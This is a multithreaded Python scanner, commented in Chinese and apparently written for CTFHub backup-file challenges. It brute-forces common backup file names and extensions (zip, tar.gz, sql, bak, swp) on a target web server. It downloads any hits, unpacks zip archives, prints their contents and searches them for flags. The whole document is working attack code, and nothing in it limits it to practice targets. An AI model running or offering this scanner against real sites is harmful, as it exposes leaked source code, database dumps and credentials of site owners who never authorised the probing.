#!/usr/bin/env python3
"""
备份文件扫描脚本（多线程版）
用于 CTFHub 备份文件下载类题目，枚举常见备份文件名+后缀组合
用法: python3 backup_scan.py <目标URL> [线程数]
示例: python3 backup_scan.py http://challenge-xxx.ctfhub.com:10800/
      python3 backup_scan.py http://challenge-xxx.ctfhub.com:10800/ 20
"""

import sys
import os
import requests
import zipfile
import tempfile
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock

# 常见备份文件名
BACKUP_NAMES = [
    "web", "website", "backup", "back",
    "www", "wwwroot", "temp", "site",
    "root", "admin", "db", "data",
    "src", "source", "code", "test",
    "old", "new", "1", "0",
]

# 常见备份文件后缀
BACKUP_EXTS = [
    "tar", "tar.gz", "zip", "rar",
    "7z", "gz", "bz2", "tar.bz2",
    "sql", "bak", "swp", "swo",
]

DEFAULT_THREADS = 10

print_lock = Lock()
found_list = []
found_lock = Lock()
counter = {"done": 0, "total": 0}
counter_lock = Lock()


def _print(msg: str):
    with print_lock:
        print(msg)


def scan_one(base_url: str, filename: str) -> tuple | None:
    """扫描单个备份文件"""
    url = f"{base_url}{filename}"
    try:
        r = requests.get(url, timeout=10)
    except requests.RequestException:
        r = None

    with counter_lock:
        counter["done"] += 1
        done = counter["done"]
        total = counter["total"]

    if r is None:
        return None

    if r.status_code == 200:
        size = len(r.content)
        _print(f"[+] 找到! {url} ({size} bytes)")
        return (url, filename, r.content)
    elif r.status_code == 403:
        _print(f"[*] 403 Forbidden: {filename}")

    if done % 20 == 0:
        _print(f"[.] 已尝试 {done}/{total}...")

    return None


def scan_backup(base_url: str, threads: int = DEFAULT_THREADS):
    if not base_url.endswith("/"):
        base_url += "/"

    # 生成所有组合
    tasks = [f"{name}.{ext}" for name in BACKUP_NAMES for ext in BACKUP_EXTS]
    counter["total"] = len(tasks)
    counter["done"] = 0

    print(f"[*] 目标: {base_url}")
    print(f"[*] 文件名: {len(BACKUP_NAMES)} 个")
    print(f"[*] 后缀: {len(BACKUP_EXTS)} 个")
    print(f"[*] 总组合数: {len(tasks)}")
    print(f"[*] 线程数: {threads}")
    print("[*] 开始扫描...\n")

    # 多线程扫描
    with ThreadPoolExecutor(max_workers=threads) as pool:
        futures = {
            pool.submit(scan_one, base_url, filename): filename
            for filename in tasks
        }
        for future in as_completed(futures):
            result = future.result()
            if result:
                with found_lock:
                    found_list.append(result)

    print(f"\n[*] 扫描完毕，共尝试 {len(tasks)} 个路径")

    if not found_list:
        print("[-] 未找到备份文件")
        return

    print(f"[+] 共找到 {len(found_list)} 个备份文件:\n")
    for url, filename, content in found_list:
        print(f"  {url} ({len(content)} bytes)")

    # 尝试下载并分析 zip 文件
    for url, filename, content in found_list:
        if filename.endswith(".zip"):
            print(f"\n[*] 分析 {filename}...")
            analyze_zip(content, base_url)


def analyze_zip(content: bytes, base_url: str):
    """分析 zip 文件内容，寻找 flag"""
    try:
        with tempfile.TemporaryDirectory() as tmpdir:
            zip_path = os.path.join(tmpdir, "backup.zip")
            with open(zip_path, "wb") as f:
                f.write(content)

            with zipfile.ZipFile(zip_path, "r") as zf:
                print(f"[*] ZIP 内容:")
                for info in zf.infolist():
                    print(f"    {info.filename} ({info.file_size} bytes)")

                zf.extractall(tmpdir)

                for info in zf.infolist():
                    filepath = os.path.join(tmpdir, info.filename)
                    if os.path.isfile(filepath):
                        try:
                            with open(filepath, "r", errors="ignore") as f:
                                file_content = f.read()

                            print(f"\n[*] {info.filename} 内容:")
                            print(f"    {file_content[:200]}")

                            if "flag" in info.filename.lower():
                                online_url = base_url + info.filename
                                print(f"\n[*] 尝试在线访问: {online_url}")
                                try:
                                    r = requests.get(online_url, timeout=10)
                                    if r.status_code == 200:
                                        print(f"[+] 在线内容: {r.text[:200]}")
                                        if "ctfhub{" in r.text or "flag{" in r.text:
                                            print(f"\n[+] FLAG: {r.text.strip()}")
                                except requests.RequestException:
                                    pass
                        except Exception:
                            pass
    except zipfile.BadZipFile:
        print("[-] 无效的 ZIP 文件")
    except Exception as e:
        print(f"[-] 分析失败: {e}")


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("用法: python3 backup_scan.py <目标URL> [线程数]")
        print("示例: python3 backup_scan.py http://challenge-xxx.ctfhub.com:10800/")
        print("      python3 backup_scan.py http://challenge-xxx.ctfhub.com:10800/ 20")
        sys.exit(1)

    url = sys.argv[1]
    t = int(sys.argv[2]) if len(sys.argv) >= 3 else DEFAULT_THREADS

    scan_backup(url, t)
